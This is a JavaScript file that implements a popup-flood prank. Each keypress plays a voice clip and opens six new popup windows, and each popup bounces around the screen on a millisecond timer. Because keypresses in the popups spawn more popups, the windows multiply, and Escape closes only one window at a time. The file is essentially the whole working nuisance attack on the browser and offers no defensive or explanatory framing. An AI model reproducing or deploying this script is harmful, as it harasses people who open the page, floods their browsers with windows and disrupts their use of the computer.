const voice = document.getElementById("mortVoice");

let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;
let flagRun = 1;

function playVoice() {
  if (!voice) return;
  voice.currentTime = 0;
  voice.play().catch(() => {});
}

function openWindow() {
  return window.open(
    `${window.location.pathname}?mort=1${window.location.hash}`,
    "_blank",
    "noopener,noreferrer,menubar=no,status=no,toolbar=no,resizable=no,width=400,height=400,titlebar=no,alwaysRaised=yes"
  );
}

function procreate() {
  for (let i = 0; i < 6; i++) {
    openWindow();
  }
}

function newXlt() {
  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;

  if (xPos > screen.availLeft + screen.availWidth - window.outerWidth) {
    newXlt();
  }

  if (xPos < screen.availLeft) {
    newXrt();
  }

  if (yPos > screen.availTop + screen.availHeight - window.outerHeight) {
    newYup();
  }

  if (yPos < screen.availTop) {
    newYdn();
  }

  if (flagRun === 1) {
    try {
      window.moveTo(Math.round(xPos), Math.round(yPos));
    } catch (_) {}
    setTimeout(playBall, 1);
  }
}

function handleKeyDown(event) {
  if (event.key === "Escape") {
    flagRun = 0;
    window.close();
    return;
  }

  playVoice();
  procreate();
}

window.addEventListener("keydown", handleKeyDown);

const isPopup = new URLSearchParams(window.location.search).get("mort") === "1";

if (isPopup) {
  playBall();
}
